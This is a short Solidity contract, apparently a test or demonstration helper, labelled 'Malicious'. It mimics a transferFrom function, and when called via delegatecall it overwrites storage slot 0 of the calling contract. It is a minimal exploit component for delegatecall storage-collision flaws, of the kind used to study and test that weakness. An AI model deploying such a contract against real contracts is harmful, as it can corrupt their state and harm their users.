// Adversarial helper: when executed via delegatecall it will write non-zero to slot 0 of the caller.
contract Malicious {
    uint256 seed;
    constructor(uint256 _s) { seed = _s; }
    // matches selector bytes4(keccak256("transferFrom(address,address,uint256)"))
    function transferFrom(address, address, uint256) public {
        // write to storage slot 0 of the executing contract (if delegatecall, this is C's storage)
        assembly {
            sstore(0, add(1, sload(seed.slot)))
        }
    }
}

